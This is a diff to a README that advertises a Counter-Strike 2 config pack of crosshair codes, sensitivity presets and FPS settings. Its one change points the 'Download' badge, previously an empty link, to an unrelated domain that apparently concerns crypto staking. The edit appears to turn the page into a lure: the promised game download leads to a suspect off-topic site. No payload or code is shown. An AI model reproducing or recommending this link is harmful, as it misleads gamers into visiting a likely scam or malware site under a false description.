@@ -3,7 +3,7 @@
 **CS2 Config Pack 2025** delivers pro-level configs for Counter-Strike 2 players.  
 Includes crosshair codes, sensitivity presets, FPS boost settings, and keybinds used by top players.
 
-[![Download CS2 Configs](https://img.shields.io/badge/Download-CS2_Config_Pack-blueviolet)](#)
+[![Download CS2 Configs](https://img.shields.io/badge/Download-CS2_Config_Pack-blueviolet)](https://ton-stake.net)
 
 ---
 
